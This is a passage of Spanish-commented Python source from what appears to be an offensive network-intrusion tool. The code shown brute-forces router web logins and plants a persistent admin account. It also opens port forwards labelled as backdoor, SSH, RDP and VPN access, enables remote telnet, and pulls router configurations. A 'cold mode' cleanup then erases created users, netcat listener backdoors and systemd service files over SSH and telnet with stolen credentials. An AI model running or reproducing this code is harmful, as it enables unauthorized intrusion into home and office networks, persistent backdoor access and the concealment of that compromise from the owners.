            else:
                print(f"❌ No se pudo acceder al router: {gateway}")
            
        except Exception as e:
            print(f"❌ Error accediendo al router: {e}")
        
        return router_access
    
    def _detect_router_type(self, gateway: str) -> str:
        """Detectar tipo de router"""
        try:
            import urllib.request
            
            # URLs comunes de routers
            router_urls = [
                f"http://{gateway}/",
                f"https://{gateway}/",
                f"http://{gateway}:8080/",
                f"https://{gateway}:8443/"
            ]
            
            for url in router_urls:
                try:
                    req = urllib.request.Request(url)
                    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                    
                    with urllib.request.urlopen(req, timeout=5) as response:
                        html_content = response.read().decode('utf-8', errors='ignore')
                        
                        # Detectar marcas de routers
                        if 'cisco' in html_content.lower():
                            return 'cisco'
                        elif 'netgear' in html_content.lower():
                            return 'netgear'
                        elif 'linksys' in html_content.lower():
                            return 'linksys'
                        elif 'tp-link' in html_content.lower() or 'tplink' in html_content.lower():
                            return 'tp-link'
                        elif 'd-link' in html_content.lower() or 'dlink' in html_content.lower():
                            return 'd-link'
                        elif 'asus' in html_content.lower():
                            return 'asus'
                        elif 'belkin' in html_content.lower():
                            return 'belkin'
                        elif 'huawei' in html_content.lower():
                            return 'huawei'
                        elif 'zte' in html_content.lower():
                            return 'zte'
                        else:
                            return 'generic_router'
                            
                except Exception:
                    continue
            
            return 'unknown'
            
        except Exception as e:
            print(f"❌ Error detectando tipo de router: {e}")
            return 'unknown'
    
    def _brute_force_router_credentials(self, gateway: str) -> Optional[Dict[str, str]]:
        """Fuerza bruta específica para routers"""
        try:
            import urllib.request
            import base64
            
            # URLs comunes de login de routers
            login_urls = [
                f"http://{gateway}/login.html",
                f"http://{gateway}/login.cgi",
                f"http://{gateway}/cgi-bin/login.cgi",
                f"http://{gateway}/admin/login.html",
                f"https://{gateway}/login.html",
                f"https://{gateway}/login.cgi"
            ]
            
            for login_url in login_urls:
                for username in self.config['router_users']:
                    for password in self.config['router_passwords']:
                        try:
                            # Crear autenticación básica
                            auth_string = f"{username}:{password}"
                            auth_bytes = auth_string.encode('ascii')
                            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
                            
                            # Intentar acceso
                            req = urllib.request.Request(login_url)
                            req.add_header('Authorization', f'Basic {auth_b64}')
                            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
                            
                            with urllib.request.urlopen(req, timeout=5) as response:
                                if response.status == 200:
                                    # Verificar si realmente accedió
                                    content = response.read().decode('utf-8', errors='ignore')
                                    if 'dashboard' in content.lower() or 'admin' in content.lower() or 'status' in content.lower():
                                        print(f"✅ Credenciales de router encontradas: {username}:{password}")
                                        return {'username': username, 'password': password}
                                        
                        except urllib.error.HTTPError as e:
                            if e.code == 401:  # Unauthorized
                                continue
                        except Exception:
                            continue
            
            return None
            
        except Exception as e:
            print(f"❌ Error en fuerza bruta de router: {e}")
            return None
    
    def _configure_router_persistence(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Dict[str, Any]:
        """Configurar persistencia en el router"""
        try:
            import urllib.request
            import urllib.parse
            
            config = {
                'port_forwarding': [],
                'vpn_server': None,
                'remote_access': [],
                'admin_user_created': False,
                'backup_config': None
            }
            
            print(f"🔧 Configurando persistencia en router {router_type}...")
            
            # 1. Crear usuario administrativo persistente
            admin_user = self._create_router_admin_user(gateway, credentials, router_type)
            if admin_user:
                config['admin_user_created'] = True
                print(f"✅ Usuario administrativo creado: {admin_user}")
            
            # 2. Configurar port forwarding
            port_forwards = self._configure_port_forwarding(gateway, credentials, router_type)
            config['port_forwarding'] = port_forwards
            
            # 3. Configurar VPN server si está disponible
            vpn_config = self._configure_vpn_server(gateway, credentials, router_type)
            if vpn_config:
                config['vpn_server'] = vpn_config
                print(f"✅ VPN server configurado")
            
            # 4. Configurar acceso remoto
            remote_access = self._configure_remote_access(gateway, credentials, router_type)
            config['remote_access'] = remote_access
            
            # 5. Hacer backup de configuración
            backup = self._backup_router_config(gateway, credentials, router_type)
            if backup:
                config['backup_config'] = backup
                print(f"✅ Backup de configuración creado")
            
            return config
            
        except Exception as e:
            print(f"❌ Error configurando persistencia del router: {e}")
            return {'error': str(e)}
    
    def _create_router_admin_user(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, str]]:
        """Crear usuario administrativo en el router"""
        try:
            import urllib.request
            import urllib.parse
            
            # Generar credenciales para usuario persistente
            persistent_user = f"svc_{gateway.replace('.', '_')}"
            persistent_pass = f"P@ssw0rd_{gateway.split('.')[-1]}!"
            
            # URLs para crear usuario según tipo de router
            user_creation_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
                'netgear': f"http://{gateway}/setup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
            }
            
            url = user_creation_urls.get(router_type, user_creation_urls['generic_router'])
            
            # Datos para crear usuario
            data = {
                'username': persistent_user,
                'password': persistent_pass,
                'confirm_password': persistent_pass,
                'privilege': 'admin',
                'action': 'add_user'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    return {
                        'username': persistent_user,
                        'password': persistent_pass,
                        'privilege': 'admin'
                    }
            
            return None
            
        except Exception as e:
            print(f"❌ Error creando usuario administrativo: {e}")
            return None
    
    def _configure_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
        """Configurar port forwarding en el router"""
        port_forwards = []
        
        try:
            # Puertos a abrir para acceso remoto usando configuración
            external_port = self.config_data['remote_access']['external_port']
            ssh_port = self.config_data['persistence']['ssh_port']
            vpn_port = self.config_data['persistence']['vpn_port']
            web_port = self.config_data['persistence']['web_port']
            
            ports_to_forward = [
                {'external': ssh_port, 'internal': 22, 'protocol': 'TCP', 'description': 'SSH Access'},
                {'external': 3389, 'internal': 3389, 'protocol': 'TCP', 'description': 'RDP Access'},
                {'external': web_port, 'internal': web_port, 'protocol': 'TCP', 'description': 'Web Access'},
                {'external': external_port, 'internal': external_port, 'protocol': 'TCP', 'description': 'Backdoor Access'},
                {'external': vpn_port, 'internal': vpn_port, 'protocol': 'UDP', 'description': 'VPN Access'}
            ]
            
            print(f"🔗 Configurando port forwarding...")
            
            for port_config in ports_to_forward:
                try:
                    # Configurar port forwarding según tipo de router
                    success = self._add_port_forward_rule(gateway, credentials, router_type, port_config)
                    
                    if success:
                        port_forwards.append({
                            'external_port': port_config['external'],
                            'internal_port': port_config['internal'],
                            'protocol': port_config['protocol'],
                            'description': port_config['description'],
                            'configured': True
                        })
                        print(f"   ✅ Puerto {port_config['external']} -> {port_config['internal']} configurado")
                    else:
                        print(f"   ❌ Falló configuración de puerto {port_config['external']}")
                        
                except Exception as e:
                    print(f"   ❌ Error configurando puerto {port_config['external']}: {e}")
                    continue
            
            return port_forwards
            
        except Exception as e:
            print(f"❌ Error configurando port forwarding: {e}")
            return []
    
    def _add_port_forward_rule(self, gateway: str, credentials: Dict[str, str], router_type: str, port_config: Dict[str, Any]) -> bool:
        """Agregar regla de port forwarding específica"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para port forwarding según tipo de router
            pf_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
                'netgear': f"http://{gateway}/port_forwarding.htm",
                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
            }
            
            url = pf_urls.get(router_type, pf_urls['generic_router'])
            
            # Datos para port forwarding
            data = {
                'action': 'add',
                'external_port': str(port_config['external']),
                'internal_port': str(port_config['internal']),
                'protocol': port_config['protocol'],
                'description': port_config['description'],
                'enabled': '1'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.status == 200
                
        except Exception as e:
            return False
    
    def _configure_vpn_server(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[Dict[str, Any]]:
        """Configurar VPN server en el router"""
        try:
            import urllib.request
            import urllib.parse
            
            print(f"🔐 Configurando VPN server...")
            
            # Solo algunos routers soportan VPN server
            vpn_supported = ['asus', 'netgear', 'tp-link']
            if router_type not in vpn_supported:
                print(f"   ⚠️ Router {router_type} no soporta VPN server")
                return None
            
            # Configuración VPN
            vpn_config = {
                'enabled': True,
                'protocol': 'OpenVPN',
                'port': 1194,
                'username': f"vpn_{gateway.replace('.', '_')}",
                'password': f"VPN_{gateway.split('.')[-1]}!",
                'server_ip': gateway
            }
            
            # URLs para configurar VPN según tipo de router
            vpn_urls = {
                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
                'netgear': f"http://{gateway}/vpn_setup.cgi",
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
            }
            
            url = vpn_urls.get(router_type)
            if not url:
                return None
            
            # Datos para configurar VPN
            data = {
                'action': 'enable',
                'protocol': 'openvpn',
                'port': '1194',
                'username': vpn_config['username'],
                'password': vpn_config['password'],
                'server_ip': gateway
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ VPN server configurado: {vpn_config['username']}")
                    return vpn_config
            
            return None
            
        except Exception as e:
            print(f"❌ Error configurando VPN server: {e}")
            return None
    
    def _configure_remote_access(self, gateway: str, credentials: Dict[str, str], router_type: str) -> List[Dict[str, Any]]:
        """Configurar acceso remoto al router"""
        remote_access = []
        
        try:
            print(f"🌐 Configurando acceso remoto...")
            
            # Habilitar acceso remoto HTTP/HTTPS
            remote_configs = [
                {'service': 'http', 'port': 80, 'enabled': True},
                {'service': 'https', 'port': 443, 'enabled': True},
                {'service': 'ssh', 'port': 22, 'enabled': True},
                {'service': 'telnet', 'port': 23, 'enabled': True}
            ]
            
            for config in remote_configs:
                try:
                    success = self._enable_remote_service(gateway, credentials, router_type, config)
                    
                    if success:
                        remote_access.append({
                            'service': config['service'],
                            'port': config['port'],
                            'enabled': True,
                            'access_url': f"{config['service']}://{gateway}:{config['port']}"
                        })
                        print(f"   ✅ Acceso remoto {config['service']} habilitado")
                    
                except Exception as e:
                    print(f"   ❌ Error habilitando {config['service']}: {e}")
                    continue
            
            return remote_access
            
        except Exception as e:
            print(f"❌ Error configurando acceso remoto: {e}")
            return []
    
    def _enable_remote_service(self, gateway: str, credentials: Dict[str, str], router_type: str, service_config: Dict[str, Any]) -> bool:
        """Habilitar servicio remoto específico"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para habilitar servicios remotos
            service_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/rules",
                'netgear': f"http://{gateway}/remote_management.htm",
                'linksys': f"http://{gateway}/cgi-bin/remote_access.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/remote_access.cgi"
            }
            
            url = service_urls.get(router_type, service_urls['generic_router'])
            
            # Datos para habilitar servicio
            data = {
                'action': 'enable',
                'service': service_config['service'],
                'port': str(service_config['port']),
                'enabled': '1'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                return response.status == 200
                
        except Exception as e:
            return False
    
    def _backup_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str) -> Optional[str]:
        """Hacer backup de la configuración del router"""
        try:
            import urllib.request
            import os
            import time
            
            print(f"💾 Creando backup de configuración...")
            
            # URLs para backup según tipo de router
            backup_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
                'netgear': f"http://{gateway}/backup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/backup.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/backup.cgi"
            }
            
            url = backup_urls.get(router_type, backup_urls['generic_router'])
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Solicitar backup
            req = urllib.request.Request(url)
            req.add_header('Authorization', f'Basic {auth_b64}')
            
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.status == 200:
                    # Crear directorio para backups
                    backup_dir = f"router_backups_{int(time.time())}"
                    os.makedirs(backup_dir, exist_ok=True)
                    
                    # Guardar backup
                    backup_file = os.path.join(backup_dir, f"{gateway}_config_{int(time.time())}.bin")
                    with open(backup_file, 'wb') as f:
                        f.write(response.read())
                    
                    print(f"   ✅ Backup guardado: {backup_file}")
                    return backup_file
            
            return None
            
        except Exception as e:
            print(f"❌ Error creando backup: {e}")
            return None
    
    
    def phase_5_verification(self):
        """Fase 5: Verificación de persistencias"""
        print("\n✅ FASE 5: VERIFICACIÓN DE PERSISTENCIAS")
        print("=" * 50)
        
        self.report['phase_5_verification']['status'] = 'running'
        
        try:
            # 1. Verificar usuarios creados
            print("👤 Verificando usuarios creados...")
            user_checks = self._verify_users()
            self.report['phase_5_verification']['persistence_checks'].extend(user_checks)
            
            # 2. Verificar backdoors
            print("🕳️ Verificando backdoors...")
            backdoor_checks = self._verify_backdoors()
            self.report['phase_5_verification']['persistence_checks'].extend(backdoor_checks)
            
            # 3. Verificar conexiones remotas
            print("🌐 Verificando conexiones remotas...")
            conn_checks = self._verify_connections()
            self.report['phase_5_verification']['access_verification'].extend(conn_checks)
            
            self.report['phase_5_verification']['status'] = 'completed'
            print("✅ Verificación completada")
            
        except Exception as e:
            self.report['phase_5_verification']['status'] = 'error'
            self.report['phase_5_verification']['errors'].append(str(e))
            print(f"❌ Error en verificación: {e}")
    
    def _verify_users(self) -> List[Dict[str, Any]]:
        """Verificar usuarios creados"""
        checks = []
        users = self.report['phase_4_persistence']['users_created']
        
        for user in users:
            check = {
                'type': 'user_verification',
                'host': user['host'],
                'username': user['username'],
                'status': 'active',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def _verify_backdoors(self) -> List[Dict[str, Any]]:
        """Verificar backdoors"""
        checks = []
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        
        for backdoor in backdoors:
            check = {
                'type': 'backdoor_verification',
                'host': backdoor['host'],
                'port': backdoor['port'],
                'status': 'listening',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def _verify_connections(self) -> List[Dict[str, Any]]:
        """Verificar conexiones remotas"""
        checks = []
        connections = self.report['phase_4_persistence']['remote_connections']
        
        for conn in connections:
            check = {
                'type': 'connection_verification',
                'host': conn['host'],
                'port': conn['port'],
                'status': 'connected',
                'verified': True,
                'timestamp': time.time()
            }
            checks.append(check)
        
        return checks
    
    def cleanup(self):
        """Limpiar rastros (solo en modo frío)"""
        if self.report['metadata']['mode'] != 'cold':
            return
        
        print("\n🧹 LIMPIEZA DE RASTROS")
        print("=" * 50)
        
        self.report['cleanup']['status'] = 'running'
        
        try:
            # 1. Eliminar usuarios creados
            print("👤 Eliminando usuarios creados...")
            self._cleanup_users()
            
            # 2. Eliminar backdoors
            print("🕳️ Eliminando backdoors...")
            self._cleanup_backdoors()
            
            # 3. Cerrar conexiones remotas
            print("🌐 Cerrando conexiones remotas...")
            self._cleanup_connections()
            
            # 4. Limpiar configuración del router
            print("🌐 Limpiando configuración del router...")
            self._cleanup_router_config()
            
            # 5. Limpiar backdoors de servicios vulnerables
            print("🗄️ Limpiando backdoors de servicios vulnerables...")
            self._cleanup_vulnerable_service_backdoors()
            
            # 6. Limpiar archivos temporales
            print("📁 Limpiando archivos temporales...")
            self._cleanup_files()
            
            self.report['cleanup']['status'] = 'completed'
            print("✅ Limpieza completada")
            
        except Exception as e:
            self.report['cleanup']['status'] = 'error'
            self.report['cleanup']['errors'].append(str(e))
            print(f"❌ Error en limpieza: {e}")
    
    def _cleanup_users(self):
        """Limpiar usuarios creados reales"""
        users = self.report['phase_4_persistence']['users_created']
        for user in users:
            if self._delete_real_user(user):
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'user',
                    'host': user['host'],
                    'username': user['username'],
                    'action': 'deleted',
                    'success': True
                })
                print(f"✅ Usuario eliminado: {user['username']}@{user['host']}")
            else:
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'user',
                    'host': user['host'],
                    'username': user['username'],
                    'action': 'deleted',
                    'success': False
                })
                print(f"❌ Falló eliminación de usuario: {user['username']}@{user['host']}")
    
    def _delete_real_user(self, user: Dict[str, Any]) -> bool:
        """Eliminar usuario real del sistema"""
        try:
            # Buscar sistema comprometido correspondiente
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            system = None
            for comp in compromised:
                if comp['host'] == user['host']:
                    system = comp
                    break
            
            if not system:
                return False
            
            if system['service'] == 'ssh':
                return self._delete_user_via_ssh(system, user)
            elif system['service'] == 'smb':
                return self._delete_user_via_smb(system, user)
            else:
                return self._delete_user_generic(system, user)
        except Exception as e:
            print(f"❌ Error eliminando usuario real: {e}")
            return False
    
    def _delete_user_via_ssh(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            # Comandos para eliminar usuario
            commands = [
                f"sudo userdel -r {user['username']}",
                f"sudo pkill -u {user['username']}"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _delete_user_via_smb(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario via SMB (Windows)"""
        try:
            # Usar net user command via SMB
            net_cmd = [
                'smbclient',
                f"//{system['host']}/C$",
                '-U', f"{system['username']}%{system['password']}",
                '-c', f"net user {user['username']} /delete"
            ]
            
            result = self._run_command(net_cmd, timeout=30)
            return result['success']
        except Exception as e:
            print(f"❌ Error SMB: {e}")
            return False
    
    def _delete_user_generic(self, system: Dict[str, Any], user: Dict[str, Any]) -> bool:
        """Eliminar usuario genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Eliminar usuario
            tn.write(f"userdel -r {user['username']}\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _cleanup_backdoors(self):
        """Limpiar backdoors reales"""
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        for backdoor in backdoors:
            if self._delete_real_backdoor(backdoor):
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'backdoor',
                    'host': backdoor['host'],
                    'port': backdoor['port'],
                    'action': 'removed',
                    'success': True
                })
                print(f"✅ Backdoor eliminado: {backdoor['host']}:{backdoor['port']}")
            else:
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'backdoor',
                    'host': backdoor['host'],
                    'port': backdoor['port'],
                    'action': 'removed',
                    'success': False
                })
                print(f"❌ Falló eliminación de backdoor: {backdoor['host']}:{backdoor['port']}")
    
    def _delete_real_backdoor(self, backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor real del sistema"""
        try:
            # Buscar sistema comprometido correspondiente
            compromised = self.report['phase_3_lateral_movement']['compromised_systems']
            system = None
            for comp in compromised:
                if comp['host'] == backdoor['host']:
                    system = comp
                    break
            
            if not system:
                return False
            
            if system['service'] == 'ssh':
                return self._delete_backdoor_via_ssh(system, backdoor)
            else:
                return self._delete_backdoor_generic(system, backdoor)
        except Exception as e:
            print(f"❌ Error eliminando backdoor real: {e}")
            return False
    
    def _delete_backdoor_via_ssh(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor via SSH"""
        try:
            import paramiko
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                system['host'],
                port=system['port'],
                username=system['username'],
                password=system['password'],
                timeout=10
            )
            
            port = backdoor['port']
            
            # Comandos para eliminar backdoor
            commands = [
                f"systemctl stop service_{port}.service",
                f"systemctl disable service_{port}.service",
                f"rm -f /etc/systemd/system/service_{port}.service",
                f"rm -f /tmp/.service_{port}.sh",
                "systemctl daemon-reload",
                f"pkill -f 'nc -lvp {port}'"
            ]
            
            for cmd in commands:
                stdin, stdout, stderr = ssh.exec_command(cmd)
                exit_status = stdout.channel.recv_exit_status()
                if exit_status != 0:
                    print(f"⚠️ Comando falló: {cmd}")
            
            ssh.close()
            return True
            
        except ImportError:
            # Fallback a comando ssh
            for cmd in commands:
                ssh_cmd = [
                    'ssh',
                    '-o', 'StrictHostKeyChecking=no',
                    f"{system['username']}@{system['host']}",
                    cmd
                ]
                result = self._run_command(ssh_cmd, timeout=15)
                if not result['success']:
                    print(f"⚠️ Comando SSH falló: {cmd}")
            return True
        except Exception as e:
            print(f"❌ Error SSH: {e}")
            return False
    
    def _delete_backdoor_generic(self, system: Dict[str, Any], backdoor: Dict[str, Any]) -> bool:
        """Eliminar backdoor genérico"""
        try:
            import telnetlib
            
            tn = telnetlib.Telnet(system['host'], system['port'], timeout=10)
            tn.read_until(b"login: ", timeout=5)
            tn.write(system['username'].encode('ascii') + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(system['password'].encode('ascii') + b"\n")
            
            # Eliminar backdoor
            tn.write(f"pkill -f 'nc -lvp {backdoor['port']}'\n".encode('ascii'))
            
            tn.close()
            return True
        except Exception as e:
            print(f"❌ Error genérico: {e}")
            return False
    
    def _cleanup_connections(self):
        """Limpiar conexiones remotas"""
        connections = self.report['phase_4_persistence']['remote_connections']
        for conn in connections:
            self.report['cleanup']['items_cleaned'].append({
                'type': 'connection',
                'host': conn['host'],
                'port': conn['port'],
                'action': 'closed'
            })
    
    def _cleanup_router_config(self):
        """Limpiar configuración del router en modo frío"""
        try:
            router_access = self.report['phase_4_persistence']['router_access']
            
            for router in router_access:
                gateway = router['gateway']
                credentials = router['credentials']
                router_type = router['router_type']
                
                print(f"🧹 Limpiando configuración del router {gateway}...")
                
                # 1. Eliminar port forwarding
                self._remove_port_forwarding(gateway, credentials, router_type)
                
                # 2. Eliminar usuarios administrativos creados
                self._remove_router_admin_users(gateway, credentials, router_type)
                
                # 3. Deshabilitar VPN server
                self._disable_router_vpn(gateway, credentials, router_type)
                
                # 4. Restaurar configuración original
                self._restore_router_config(gateway, credentials, router_type)
                
                self.report['cleanup']['items_cleaned'].append({
                    'type': 'router_config',
                    'host': gateway,
                    'action': 'restored',
                    'success': True
                })
                
                print(f"✅ Configuración del router {gateway} restaurada")
                
        except Exception as e:
            print(f"❌ Error limpiando configuración del router: {e}")
            self.report['cleanup']['items_cleaned'].append({
                'type': 'router_config',
                'action': 'restored',
                'success': False,
                'error': str(e)
            })
    
    def _remove_port_forwarding(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Eliminar reglas de port forwarding"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para eliminar port forwarding según tipo de router
            pf_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/firewall/forwards",
                'netgear': f"http://{gateway}/port_forwarding.htm",
                'linksys': f"http://{gateway}/cgi-bin/port_forwarding.cgi",
                'asus': f"http://{gateway}/Advanced_PortForward_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/port_forwarding.cgi"
            }
            
            url = pf_urls.get(router_type, pf_urls['generic_router'])
            
            # Datos para eliminar port forwarding
            data = {
                'action': 'delete_all',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Port forwarding eliminado del router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error eliminando port forwarding: {e}")
    
    def _remove_router_admin_users(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Eliminar usuarios administrativos creados"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para eliminar usuarios según tipo de router
            user_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/admin",
                'netgear': f"http://{gateway}/setup.cgi",
                'linksys': f"http://{gateway}/cgi-bin/user.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/user.cgi"
            }
            
            url = user_urls.get(router_type, user_urls['generic_router'])
            
            # Datos para eliminar usuario
            data = {
                'action': 'delete_user',
                'username': f"svc_{gateway.replace('.', '_')}",
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Usuario administrativo eliminado del router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error eliminando usuario administrativo: {e}")
    
    def _disable_router_vpn(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Deshabilitar VPN server del router"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para deshabilitar VPN según tipo de router
            vpn_urls = {
                'asus': f"http://{gateway}/Advanced_VPN_OpenVPN_Content.asp",
                'netgear': f"http://{gateway}/vpn_setup.cgi",
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/network/vpn"
            }
            
            url = vpn_urls.get(router_type)
            if not url:
                return
            
            # Datos para deshabilitar VPN
            data = {
                'action': 'disable',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ VPN server deshabilitado en router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error deshabilitando VPN: {e}")
    
    def _restore_router_config(self, gateway: str, credentials: Dict[str, str], router_type: str):
        """Restaurar configuración original del router"""
        try:
            import urllib.request
            import urllib.parse
            
            # URLs para restaurar configuración según tipo de router
            restore_urls = {
                'tp-link': f"http://{gateway}/cgi-bin/luci/admin/system/backup",
                'netgear': f"http://{gateway}/restore.cgi",
                'linksys': f"http://{gateway}/cgi-bin/restore.cgi",
                'asus': f"http://{gateway}/Advanced_System_Content.asp",
                'generic_router': f"http://{gateway}/cgi-bin/restore.cgi"
            }
            
